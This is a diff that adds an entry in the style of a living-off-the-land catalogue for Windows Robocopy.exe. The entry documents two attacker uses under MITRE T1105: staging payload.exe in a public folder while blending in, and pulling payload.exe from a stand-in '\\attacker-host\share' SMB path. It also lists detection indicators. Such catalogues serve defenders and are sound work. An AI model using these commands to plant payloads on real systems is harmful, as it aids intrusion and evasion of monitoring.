@@ -1,0 +1,31 @@
+---
+Name: Robocopy.exe
+Description: Built-in Windows command-line utility for robust file and directory replication (robust copy).
+Author: Defa Mulya Pratama
+Created: 2026-10-08
+Commands:
+  - Command: robocopy C:\SourceFolder C:\Users\Public payload.exe
+    Description: Copies a file from one local directory to another using the built-in Robocopy utility.
+    Usecase: Copy or stage a file to a new location while blending in with a legitimate built-in administration tool.
+    Category: Copy
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: robocopy \\attacker-host\share C:\Users\Public payload.exe
+    Description: Copies a file from a remote SMB share to the local host using Robocopy.
+    Usecase: Transfer a file from a remote share to the local system using a signed built-in utility instead of a custom downloader.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+Full_Path:
+  - Path: C:\Windows\System32\Robocopy.exe
+  - Path: C:\Windows\SysWOW64\Robocopy.exe
+Detection:
+  - IOC: Robocopy.exe copying executable or script files into user-writable directories
+  - IOC: Robocopy.exe process with a UNC path (\\host\share) in its command line
+Resources:
+  - Link: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
+Acknowledgement:
+  - Person: Defa Mulya Pratama
+    Handle: '@defamp'
